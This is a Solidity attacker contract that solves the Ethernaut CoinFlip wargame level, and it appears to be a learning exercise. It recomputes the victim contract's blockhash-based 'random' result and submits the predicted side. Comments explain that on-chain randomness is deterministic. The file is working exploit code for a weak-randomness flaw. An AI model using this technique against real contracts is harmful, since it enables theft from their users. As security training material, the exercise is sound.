// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // bad practice to use the carat and make the compiler version flexible.  who knows what will change in the future?

import "hardhat/console.sol";
import "./CoinFlip.sol";

contract OurCoinFlip {
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // the victimContractAddr will let us work with the Ethernaut deployment of the vulnerable contract!
    constructor(address _victimContractAddr) {
        // remember we instantiate an existing contract by supplying it's address.
        // if it WASN'T an existing contract, we'd use the new keyword
        victimContract = /* new */CoinFlip(_victimContractAddr); 
    }

    function attack_flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        // send our calculated guess to the original vulnerable contract.  we always guess right
        // since we are working it out slightly ahead of the other contract
        // it's always correct because of the deterministic nature of blockchain
        victimContract.flip(side);
    }

}
